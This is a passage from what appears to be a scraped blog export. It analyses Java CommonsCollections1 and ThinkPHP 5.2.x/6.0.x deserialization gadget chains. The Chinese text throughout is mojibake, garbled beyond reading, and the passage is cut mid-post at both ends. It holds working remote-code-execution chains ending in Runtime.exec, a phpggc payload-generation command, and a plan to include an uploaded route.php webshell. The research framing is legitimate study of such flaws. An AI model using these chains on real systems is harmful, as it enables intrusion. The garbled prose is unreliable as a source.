æ­¤å¤„ç”¨çš„å°±æ˜¯Javaçš„åå°„æœºåˆ¶ï¼ŒåŠ¨æ€è°ƒç”¨ç±»å’Œæ–¹æ³•ã€‚ä¸ºäº†èƒ½åŠ¨æ€è°ƒç”¨ä»»æ„ç±»å‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¾—æ§åˆ¶iMethodNameã€iParamTypesã€iArgsï¼Œè¯¥ç±»å±æ€§å®šä¹‰åœ¨InvokerTransformerçš„æ„é€ å‡½æ•°ä¸Š 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; é‚£ä¹ˆæ¥ä¸‹æ¥å°±è·Ÿphpç±»ä¼¼äº†ï¼Œæ‰¾ä¸€ä¸ªç±»ï¼Œå®ƒçš„ç±»å±æ€§å¯æ§ï¼Œä¸”è¯¥ç±»å±æ€§åç»­è¿˜ä¼šè°ƒç”¨transformå‡½æ•°ã€‚ç”±äºå®ŒæˆRuntime.getRuntime().exec()åŠ¨ä½œéœ€è¦å¤šæ¬¡è°ƒç”¨transformå‡½æ•°ï¼ˆå…ˆè°ƒç”¨Runtime.getRuntimeå†è°ƒç”¨Runtime.execï¼‰ï¼Œæ‰€ä»¥è¿˜å¾—æ‰¾ä¸€ä¸ªèƒ½å¤šæ¬¡è°ƒç”¨transformçš„åœ°æ–¹ï¼Œæ¥çœ‹ä¸€ä¸‹ChainedTransformer 12345678private final Transformer[] iTransformers;// å¡«å……æ„é€ åçš„å®ä¾‹public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object);// è°ƒç”¨é“¾ï¼Œ &#125; return object;&#125; åœ¨Transformerçš„å­ç±»ä¸‹é¢æ‰¾åˆ°èƒ½ç”Ÿæˆå‘½ä»¤æ‰§è¡Œçš„åˆ©ç”¨é“¾å³å¯ï¼Œæ¥åˆ†æä¸€ä¸‹CommonCollections1çš„æ„é€  123456789101112// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),// è·å–Runtimeå¯¹è±¡ new InvokerTransformer(\"getMethod\", new Class[] &#123;//è·å–Runtime.getRuntime()æ–¹æ³•å¯¹è±¡ String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;// åå°„è°ƒç”¨invoke,å†invokeæ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè·å–Runtimeå®ä¾‹åŒ–å¯¹è±¡ Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\",// åå°„è°ƒç”¨execæ–¹æ³•ï¼Œæ‰§è¡Œæœ€ç»ˆçš„å‘½ä»¤ new Class[] &#123; String.class &#125;, execArgs), new ConstantTransformer(1) &#125;; é“¾çš„ç¬¬ä¸€ä¸ªç»“ç‚¹é€‰ç”¨çš„æ˜¯ConstantTransformerï¼Œå…¶transformerç›´æ¥è¿”å›æ„é€ æ—¶çš„å¯¹è±¡ 123456789private final Object iConstant;// æ­¤æ—¶iConstantç½®ä¸ºRuntime.classpublic ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;// ç›´æ¥è¿”å›Runtime.class return iConstant;&#125; æœ€ç»ˆçš„è°ƒç”¨ï¼Œç±»ä¼¼ 1234567891011Object obj = Runtime.class;Class cls = obj.getClass();Method method;method = cls.getMethod(\"getMethod\",new Class[] &#123;String.class, Class[].class &#125;);obj = method.invoke(obj, new Object[] &#123;\"getRuntime\", new Class[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"invoke\",new Class[] &#123;Object.class, Object[].class &#125;);obj = method.invoke(obj, new Object[] &#123;null, new Object[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"exec\",new Class[] &#123; String.class &#125;);method.invoke(obj, new String[] &#123; \"open /System/Applications/Calculator.app\" &#125;); æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯å¦‚ä½•è§¦å‘ChainedTransformerï¼Ÿæœç´¢ä¸€ä¸‹è°ƒç”¨transformçš„ä½ç½®ï¼Œæ’é™¤æ‰xxxTransformerç±»ï¼Œæœ€æœ‰å¯èƒ½è¢«åˆ©ç”¨çš„å°±æ˜¯LazyMap.getã€TransformedMap.checkSetValueï¼Œå…¶ä¸­checkSetValueä¼šåœ¨setValueå‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™è°ƒç”¨ã€‚ æ¥ä¸‹æ¥å°±æ˜¯æ‰¾èƒ½è§¦å‘ä¸Šé¢ä¸¤ä¸ªåˆ©ç”¨æ–¹å¼çš„æ–¹æ³•ã€‚ åŒæ ·çš„ï¼Œå‰é¢åŸºç¡€çŸ¥è¯†æåˆ°ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡çš„readObjectå‡½æ•°è¢«é‡è½½äº†ï¼Œä¼šä¼˜å…ˆè°ƒç”¨é‡è½½åçš„readObjectå‡½æ•°ã€‚ æˆ‘ä»¬æœ€å¥½èƒ½åœ¨è¢«é‡è½½çš„readObjectå‡½æ•°ä¸­å‘ç°ç›¸å…³å¯æ§Mapæ•°æ®çš„æ“ä½œ(getå’ŒsetValue)ã€‚ è€Œexpä¸­sun.reflect.annotation.AnnotationInvocationHandleréå¸¸ç¬¦åˆä¸Šè¿°çš„æè¿°ã€‚ æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„readObjectå®ç° 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; åœ¨ç¬¬26è¡Œå¤„ï¼Œè°ƒç”¨äº†memberValue.setValueï¼Œè¿™é‡Œçš„memberValueæˆ‘ä»¬å¯ä»¥å°†å…¶ç½®ä¸ºæ„é€ å¥½çš„TransformedMapå®ä¾‹ã€‚ åœ¨è¿™ä¸ªTransformedMapå®ä¾‹ä¸Šï¼ŒvalueTransformerå±æ€§è¢«ç½®ä¸ºå‰æ–‡çš„ChainedTransformerã€‚è¿™æ ·è¿™ä¸ªé“¾å°±ä¸²èµ·æ¥äº†ï¼Œæ€»ç»“ä¸€ä¸‹ 1234sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValue.setValue() =&gt; TransformedMap.setValue() =&gt; TransformedMap.checkSetValue() -&gt; valueTransformer.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() ç¬¬äºŒç§ï¼Œåˆ©ç”¨LazyMap.get() CommonsCollections1ä¸­åˆ©ç”¨äº†AnnotationInvocationHandler.invokeå‡½æ•° 123456789101112131415161718public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); // ... switch(member) &#123; case \"toString\": return toStringImpl(); case \"hashCode\": return hashCodeImpl(); case \"annotationType\": return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); // ...&#125; ç¬¬15è¡Œè°ƒç”¨äº†memberValues.getå‡½æ•°ï¼Œè¿™é‡Œå¦‚æœmemberValuesè®¾ç½®ä¸ºæ„é€ å¥½çš„LazyMapå®ä¾‹ï¼Œå°†è§¦å‘è¯¥åˆ©ç”¨é“¾çš„æ‰§è¡Œã€‚ é‚£ä¹ˆæ€ä¹ˆæ¥è°ƒç”¨invokeå‡½æ•°å‘¢ï¼Ÿè¿™é‡Œç”¨åˆ°äº†ProxyåŠ¨æ€ä»£ç†æœºåˆ¶ã€‚åœ¨è¯¥æœºåˆ¶ä¸‹è¢«ä»£ç†çš„å®ä¾‹ä¸ç®¡è°ƒç”¨ä»€ä¹ˆç±»æ–¹æ³•ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨invokeå‡½æ•°ã€‚ é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ProxyåŠ¨æ€ä»£ç†AnnotationInvocationHandlerï¼Œå¹¶å°†memberValuesè®¾ç½®ä¸ºLazyMapã€‚åœ¨AnnotationInvocationHandler.readObjectå‡½æ•°é‡Œï¼Œç¬¬19è¡Œè°ƒç”¨äº†memberValues.entrySetå‡½æ•°ã€‚åœ¨åŠ¨æ€ä»£ç†ä¸‹ä¼šå…ˆè°ƒç”¨invokeå‡½æ•°ï¼Œä¸”æ­¤æ—¶çš„å‡½æ•°åentrySetä¸åœ¨toStringã€hashCodeã€annotationTypeé‡Œï¼Œé‚£ä¹ˆä¼šæœ€ç»ˆèµ°åˆ°ç¬¬15è¡Œçš„ä½ç½®ã€‚æ€»ç»“ä¸€ä¸‹è¿™ä¸ªè°ƒç”¨é“¾ 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() è¿™ä¹Ÿæ˜¯ysoserialçš„CommonsCollections1çš„è°ƒç”¨é“¾ã€‚ åç»­çš„åˆ©ç”¨é“¾åˆ†ææ”¾åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« é‡Œã€‚ 0x04 æ€»ç»“ç»è¿‡å¯¹ysoserialå·¥å…·ç”Ÿæˆçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„è°ƒè¯•ï¼Œç†Ÿæ‚‰äº†Javaçš„ååºåˆ—åŒ–çš„ä¸€ä¸ªæµç¨‹ã€‚ä½†å¯¹äºexpçš„ä¹¦å†™ä»ç„¶æœ‰å¾…æé«˜ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCommonCollections1å’Œ3ç”¨çš„override.classä½œä¸ºAnnotationåœ¨jdk8ä¸Šæ˜¯ä¸é€‚ç”¨çš„ï¼Œè¦è°ƒè¯•è¿™ä¸¤ä¸ªpayloadéœ€è¦ç”¨jdk7ï¼Œå‚è€ƒ é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œä½“ä¼šåˆ°äº†javassiståº“çš„å¼ºå¤§ï¼Œä¿®æ”¹jaråŒ…é‡Œçš„classæ–‡ä»¶éå¸¸èˆ’æœï¼ Proxyçš„åŠ¨æ€ä»£ç†æœºåˆ¶ï¼ŒJavaçš„åå°„æœºåˆ¶ç›¸ä¿¡ä¼šæ˜¯åç»­å­¦ä¹ çš„ä¸€ä¸ªé‡ç‚¹ï¼Œç»§ç»­ğŸ’ªï¼"},{"title":"ã€Code Reviewã€‘thinkphp v5.2.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜","permalink":"http://blog.0kami.cn/2019/09/10/thinkphp-5-2-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾/","text":"0x00 å‰è¨€ä¸Šå‘¨å‚ä¸äº†N1CTFï¼Œé‡Œé¢æœ‰ä¸€é“å…³äºthinkphp5çš„ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚è®°å½•ä¸€ä¸‹å…³äºè¯¥ååºåˆ—åŒ–çš„åˆ©ç”¨é“¾åˆ†æã€‚ åæ–‡ä¸»è¦åŒ…æ‹¬ä¸¤æ¡é“¾çš„åˆ©ç”¨åˆ†æï¼ˆä¸€æ¡æ˜¯æˆ‘æ‰¾çš„ï¼Œä¹Ÿæ˜¯é¢˜ç›®çš„é¢„æœŸè§£ï¼Œå¦ä¸€æ¡æ˜¯wonderkunå¸ˆå‚…æ‰¾çš„éé¢„æœŸè§£ï¼‰ 0x01 ç¯å¢ƒå‡†å¤‡è¿™é‡Œå°±ä¸ç›´æ¥ç”¨é¢˜ç›®çš„ç¯å¢ƒäº†ï¼Œé‡‡ç”¨composerç›´æ¥å®‰è£…5.2.*-devç‰ˆæœ¬ 1composer create-project topthink/think=5.2.x-dev v5.2 0x02 åˆ©ç”¨é“¾åˆ†æèƒŒæ™¯å›é¡¾tp5åœ¨æˆ‘å°è±¡é‡Œååºåˆ—åŒ–çš„åˆ©ç”¨é“¾å­˜åœ¨ä¸€ä¸ªWindowsç±»çš„ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œä½†æ˜¯åœ¨è¿™ç¯‡æ–‡ç« )çš„å¯ç¤ºä¸‹ï¼Œä¹Ÿç®—æ˜¯æ‰¾åˆ°äº†ä¸€æ¡æ–°çš„è·¯ï¼ˆå…³äº__toStringçš„è§¦å‘æ–¹å¼ï¼Œé™¤äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œè¿˜å¯ä»¥åˆ©ç”¨PHPè‡ªå¸¦å‡½æ•°å‚æ•°çš„å¼ºåˆ¶è½¬æ¢ï¼‰ã€‚ è¿™ç¯‡æ–‡ç« çš„åˆ©ç”¨é“¾æœ€åç”¨åˆ°äº†5.1.37ç‰ˆæœ¬think/Request.phpçš„ __callå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„è°ƒç”¨å‡½æ•°åå¯æ§ï¼Œæ‰€ä»¥å¯ä»¥å¯¼è‡´ä»»æ„è°ƒç”¨å…¶ä»–çš„ç±»å‡½æ•°ã€‚è€Œåœ¨5.2.xç‰ˆæœ¬ä¸å­˜åœ¨è¿™æ ·çš„ä¸€ä¸ª__callå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦é‡æ–°æ‰¾ä¸€ä¸ªæœ€ç»ˆè¾¾æˆå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è°ƒç”¨ï¼ˆ__callå‡½æ•°å‰çš„åˆ©ç”¨é“¾ä»ç„¶å¯ç”¨ï¼‰ã€‚ é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹5.2.xæ–°çš„åˆ©ç”¨é“¾å§ï¼šï¼‰ think/model/concern/Attribute.php getValueå¯å‡½æ•°åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼ˆé¢˜ç›®çš„é¢„æœŸè§£ï¼‰ç”±äº5.1.37__callå‡½æ•°å‰çš„åˆ©ç”¨é“¾ä»ç„¶å­˜åœ¨äº5.2.xç‰ˆæœ¬ï¼Œè¿™é‡Œå°±ä¸å†è¯¦è¿°äº†ã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹Conversionç±»çš„toArrayå‡½æ•° 123456789101112131415public function toArray(): array&#123; // ... // åˆå¹¶å…³è”æ•°æ® $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) &#123; if ($val instanceof Model || $val instanceof ModelCollection) &#123; // ... &#125; elseif (isset($this-&gt;visible[$key])) &#123; $item[$key] = $this-&gt;getAttr($key);// relationå’Œvisibleå­˜åœ¨åŒä¸€ä¸ªkeyå°±è¡Œ // ... &#125; // ... å»æ‰äº†æ— å…³çš„ä»£ç ï¼Œè¿™é‡Œ$this-&gt;visibleã€$this-&gt;relationå‡å¯æ§ï¼Œå¯ä¼ªé€ æ•°æ®è¿›å…¥getAttrå‡½æ•° 12345678910111213141516public function getAttr(string $name)&#123; // ... return $this-&gt;getValue($name, $value, $relation);&#125;protected function getValue(string $name, $value, bool $relation = false)&#123; // æ£€æµ‹å±æ€§è·å–å™¨ $fieldName = $this-&gt;getRealFieldName($name);// ç›´æ¥è¿”å›$nameçš„å€¼ // ... if (isset($this-&gt;withAttr[$fieldName])) &#123; // ... $closure = $this-&gt;withAttr[$fieldName]; // withAttrå†…å®¹å¯æ§ $value = $closure($value, $this-&gt;data); // åŠ¨æ€è°ƒç”¨å‡½æ•° // ... ç›´æ¥å…³æ³¨getValueå‡½æ•°ï¼Œè¯¥å‡½æ•°å¯åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œå¹¶ä¸”è°ƒç”¨å‡½æ•°ã€å‡½æ•°å‚æ•°å‡å¯æ§ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯æ‰¾ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„phpå‡½æ•°ï¼Œå¦ä¸€ç§æ˜¯åˆ©ç”¨tpè‡ªå¸¦çš„SerializableClosureè°ƒç”¨ï¼Œæ¥çœ‹ä¸€ä¸‹ç¬¬äºŒç§ã€‚ \\Opis\\Closureå¯ç”¨äºåºåˆ—åŒ–åŒ¿åå‡½æ•°ï¼Œä½¿å¾—åŒ¿åå‡½æ•°åŒæ ·å¯ä»¥è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç„¶åäº¤ç”±ä¸Šè¿°çš„$closure($value, $this-&gt;data)è°ƒç”¨æ‰§è¡Œã€‚ 123$func = function()&#123;phpinfo();&#125;;$closure = new \\Opis\\Closure\\SerializableClosure($func);$closure($value, $this-&gt;data);// è¿™é‡Œçš„å‚æ•°å¯ä»¥ä¸ç”¨ç®¡ ä»¥ä¸Šè¿°ä»£ç ä¸ºä¾‹ï¼Œå°†è°ƒç”¨phpinfoå‡½æ•°ã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬åˆ†æå®Œäº†æ•´ä¸€ä¸ªè°ƒç”¨æµç¨‹ï¼Œå›é¡¾ä¸€ä¸‹ vendor/topthink/framework/src/think/process/pipes/Windows.php __destruct -&gt;removeFiles -&gt;file_exists å¼ºåˆ¶è½¬åŒ–å­—ç¬¦ä¸²filenameï¼Œè¿™é‡Œçš„filenameå¯æ§ å¯è§¦å‘__toStringå‡½æ•°ï¼Œä¸‹ä¸€æ­¥æ‰¾å¯åˆ©ç”¨çš„__toString vendor/topthink/framework/src/think/model/concern/Conversion.php __toString -&gt; toJson -&gt; toArrayåˆ›é€ ç¬¦åˆæ¡ä»¶çš„relationå’Œvisible-&gt; getAttr ä¸‹ä¸€æ­¥è°ƒç”¨vendor/topthink/framework/src/think/model/concern/Attribute.phpçš„getValueå‡½æ•° vendor/topthink/framework/src/think/model/concern/Attribute.phpgetValue -&gt; $closureåŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œä¸”è¯¥å†…å®¹å¯æ§ä¸‹ä¸€æ­¥åˆ©ç”¨æœ‰ä¸¤ç§ï¼Œä¸€ç§æ‰¾ç¬¦åˆçš„phpå‡½æ•°ï¼Œå¦ä¸€ç§åˆ©ç”¨tpè‡ªå¸¦çš„SerializableClosureè°ƒç”¨ vendor/opis/closure/src/SerializableClosure.phpæ„é€ å¯åˆ©ç”¨çš„åŒ¿åå‡½æ•° æˆ‘æŠŠexpé›†æˆåˆ°äº†phpggcä¸Šï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆ 1./phpggc -u ThinkPHP/RCE1 'phpinfo();' è¿™é‡Œç”±äºç”¨åˆ°äº†SerializableClosureï¼Œéœ€è¦ä½¿ç”¨ç¼–ç å™¨ç¼–ç ï¼Œä¸å¯ç›´æ¥è¾“å‡ºæ‹·è´åˆ©ç”¨ã€‚ think/Db.php __callå‡½æ•°å¯å®ä¾‹åŒ–ä»»æ„ç±»ï¼ˆé¢˜ç›®çš„éé¢„æœŸè§£ï¼‰å‰é¢è¯´åˆ°5.1.37ç‰ˆæœ¬çš„åˆ©ç”¨é“¾çš„__callå‡½æ•°ï¼Œåœ¨5.2.xç‰ˆæœ¬æ²¡åŠæ³•ç”¨äº†ã€‚ä½†æ˜¯ä»__destructåˆ°__callçš„é“¾è·¯æ˜¯é€šçš„ï¼Œæˆ‘ä»¬åªéœ€è¦é‡æ–°æ‰¾ä¸€ä¸ªå¯ç”¨çš„__callå‡½æ•°å³å¯ã€‚ æ¥çœ‹ä¸€ä¸‹vendor/topthink/framework/src/think/Db.phpçš„__callå‡½æ•° 12345678public function __call($method, $args)&#123; $class = $this-&gt;config['query']; $query = new $class($this-&gt;connection); return call_user_func_array([$query, $method], $args);&#125; $this-&gt;configå’Œ$this-&gt;connectionå‡å¯æ§ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä»»æ„ç¬¦åˆæ¡ä»¶çš„ç±»ï¼Œè¿™é‡Œæ‰¾äº†think\\Url 12345678910public function __construct(App $app, array $config = [])&#123; $this-&gt;app = $app; $this-&gt;config = $config; if (is_file($app-&gt;getRuntimePath() . 'route.php')) &#123; // è¯»å–è·¯ç”±æ˜ å°„æ–‡ä»¶ $app-&gt;route-&gt;import(include $app-&gt;getRuntimePath() . 'route.php'); &#125;&#125; è¯¥æ„é€ å™¨å¼•å…¥äº†RuntimePathä¸‹çš„route.phpæ–‡ä»¶ï¼Œå› ä¸ºè¿™é“é¢˜æ˜¯å…è®¸ä¸Šä¼ æ–‡ä»¶çš„ï¼Œæ‰€ä»¥åªè¦åœ¨å¯ä¸Šä¼ çš„ç›®å½•ä¸‹ä¸Šä¼ ä¸€ä¸ªroute.phpçš„webshellå³å¯ã€‚è‡³äºRuntimePathï¼Œ$appä¸ºå¯æ§å˜é‡ï¼Œç›´æ¥ä¿®æ”¹$runtimePathçš„å†…å®¹å³å¯ã€‚ æˆ‘ä»¬ç›´æ¥æ„é€ Appå¯¹è±¡ä¸º 123456789class App&#123; protected $runtimePath; public function __construct(string $rootPath = '')&#123; $this-&gt;rootPath = $rootPath; $this-&gt;runtimePath = \"/tmp/\"; $this-&gt;route = new \\think\\route\\RuleName(); &#125;&#125; è¿™ä¸ªæ„é€ æ€è·¯å¤ªæºœäº†ï¼Œè†œä¸€æ³¢ï¼šï¼‰ æ•´ç†ä¸€ä¸‹è¿‡ç¨‹ vendor/topthink/framework/src/think/process/pipes/Windows.php__destruct -&gt;removeFiles -&gt;file_exists å¼ºåˆ¶è½¬åŒ–å­—ç¬¦ä¸²filenameï¼Œè¿™é‡Œçš„filenameå¯æ§å¯è§¦å‘__toStringå‡½æ•°ï¼Œä¸‹ä¸€æ­¥æ‰¾å¯åˆ©ç”¨çš„__toString vendor/topthink/framework/src/think/model/concern/Conversion.php__toString -&gt; toJson -&gt; toArray-&gt;appendAttrToArray-&gt;$relationè°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°ï¼Œè§¦å‘__call vendor/topthink/framework/src/think/Db.php__call -&gt; new $class($this-&gt;connection) è°ƒç”¨ä»»æ„ç±»çš„__constructå‡½æ•° vendor/topthink/framework/src/think/Url.phpæ„é€ Appç±»ï¼Œè¾¾åˆ°includeä»»æ„æ–‡ä»¶çš„æ•ˆæœ"},{"title":"ã€Code Reviewã€‘thinkphp v6.0.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜","permalink":"http://blog.0kami.cn/2019/09/10/thinkphp-6-0-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾/","text":"0x00 å‰è¨€ä¸Šä¸€ç¯‡åˆ†æäº†tp 5.2.xçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ï¼Œé¡ºç€æ€è·¯ï¼ŒæŠŠtp6.0.xä¹ŸæŒ–äº†ã€‚æœ‰ç±»ä¼¼çš„åœ°æ–¹ï¼Œä¹Ÿæœ‰éœ€è¦é‡æ–°æŒ–æ˜çš„åœ°æ–¹ã€‚ 0x01 ç¯å¢ƒå‡†å¤‡é‡‡ç”¨composerå®‰è£…6.0.*-devç‰ˆæœ¬ 1composer create-project topthink/think=6.0.x-dev v6.0 0x02 åˆ©ç”¨é“¾åˆ†æèƒŒæ™¯å›é¡¾æ‹¿åˆ°v6.0.xç‰ˆæœ¬ï¼Œç®€å•çš„çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªå¥½æ¶ˆæ¯å’Œä¸€ä¸ªåæ¶ˆæ¯ã€‚ å¥½æ¶ˆæ¯æ˜¯5.2.xç‰ˆæœ¬å‡½æ•°åŠ¨æ€è°ƒç”¨çš„ååºåˆ—åŒ–é“¾ååŠéƒ¨åˆ†ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ã€‚ åæ¶ˆæ¯æ˜¯å‰é¢5.1.xï¼Œ5.2.xç‰ˆæœ¬éƒ½åŸºäºè§¦å‘ç‚¹Windowsç±»çš„__destruct,å¥½å·§ä¸å·§çš„æ˜¯6.0.xç‰ˆæœ¬å–æ¶ˆäº†Windowsç±»ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¾—é‡æ–°æ‰¾ä¸€ä¸ªåˆé€‚çš„èµ·å§‹è§¦å‘ç‚¹ï¼Œæ‰èƒ½ç»§ç»­ä½¿ç”¨ä¸Šé¢çš„å¥½æ¶ˆæ¯ã€‚ vendor/topthink/think-orm/src/Model.php æ–°èµ·å§‹è§¦å‘ç‚¹ä¸ºäº†èŠ‚çœç¯‡å¹…ï¼Œåæ–‡ä¸å†é‡å¤ä»‹ç»è§¦å‘__toStringå‡½æ•°åçš„åˆ©ç”¨é“¾ï¼Œè¿™éƒ¨åˆ†åŒ5.2.xç‰ˆæœ¬ç›¸åŒ(ä¸è¿‡wonderkunå¸ˆå‚…çš„åˆ©ç”¨é“¾å·²å¤±æ•ˆï¼ŒåŠ¨æ€å‡½æ•°è°ƒç”¨çš„åˆ©ç”¨é“¾è¿˜èƒ½ç”¨)ã€‚ é€šå¸¸æœ€å¥½çš„ååºåˆ—åŒ–èµ·å§‹ç‚¹ä¸º__destructã€__wakeupï¼Œå› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°çš„è°ƒç”¨åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥æ‰¾æ­¤ç±»å‡½æ•°ã€‚è¿™é‡Œæˆ‘æ‰¾äº†vendor/topthink/think-orm/src/Model.phpçš„__destructå‡½æ•°ã€‚ 1234567891011121314151617public function __destruct()&#123; if ($this-&gt;lazySave) &#123;// æ„é€ lazySaveä¸ºtrueï¼Œè¿›å…¥saveå‡½æ•° $this-&gt;save(); &#125;&#125;public function save(array $data = [], string $sequence = null): bool&#123; // ... if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) &#123; return false; &#125; $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); // ...&#125; é¦–å…ˆæ„é€ lazySaveçš„å€¼ä¸ºtrue,ä»è€Œè¿›å…¥saveå‡½æ•°ã€‚ è¿™æ¬¡è§¦å‘ç‚¹ä½äºupdateDataå‡½æ•°å†…ï¼Œä¸ºäº†é˜²æ­¢å‰é¢çš„æ¡ä»¶ç¬¦åˆï¼Œè€Œç›´æ¥returnï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ„é€ ç›¸å…³å‚æ•° 1234567891011public function isEmpty(): bool&#123; return empty($this-&gt;data);&#125;protected function trigger(string $event): bool&#123; if (!$this-&gt;withEvent) &#123; return true; &#125; // ... å…¶ä¸­éœ€ä¿è¯isEmptyè¿”å›falseï¼Œä»¥åŠ$this-&gt;trigger(&#39;BeforeWrite&#39;)è¿”å›true æ„é€ $this-&gt;dataä¸ºéç©ºæ•°ç»„ æ„é€ $this-&gt;withEventä¸ºfalse æ„é€ $this-&gt;existsä¸ºtrue ä»è€Œè¿›å…¥æˆ‘ä»¬éœ€è¦çš„updateDataå‡½æ•°ï¼Œæ¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°å†…å®¹ 12345678910111213141516171819202122protected function updateData(): bool&#123; // äº‹ä»¶å›è°ƒ if (false === $this-&gt;trigger('BeforeUpdate')) &#123;// æ­¤å¤„å‰é¢å·²ç¬¦åˆæ¡ä»¶ return false; &#125; // ... // è·å–æœ‰æ›´æ–°çš„æ•°æ® $data = $this-&gt;getChangedData(); if (empty($data)) &#123; // å…³è”æ›´æ–° if (!empty($this-&gt;relationWrite)) &#123; $this-&gt;autoRelationUpdate(); &#125; return true; &#125; // ... // æ£€æŸ¥å…è®¸å­—æ®µ $allowFields = $this-&gt;checkAllowFields(); // è§¦å‘__toString åŒæ ·çš„ï¼Œä¸ºäº†é˜²æ­¢æå‰returnï¼Œéœ€è¦ç¬¦åˆ$dataéç©ºï¼Œæ¥çœ‹ä¸€ä¸‹getChangedData 1234567891011121314public function getChangedData(): array&#123; $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123; if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123; return 1; &#125; return is_object($a) || $a != $b ? 1 : 0; &#125;); // ... return $data;&#125; è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¼ºè¡Œç½®$this-&gt;forceä¸ºtrueï¼Œç›´æ¥è¿”å›æˆ‘ä»¬å‰é¢æ„é€ çš„éç©º$this-&gt;data è¿™æ 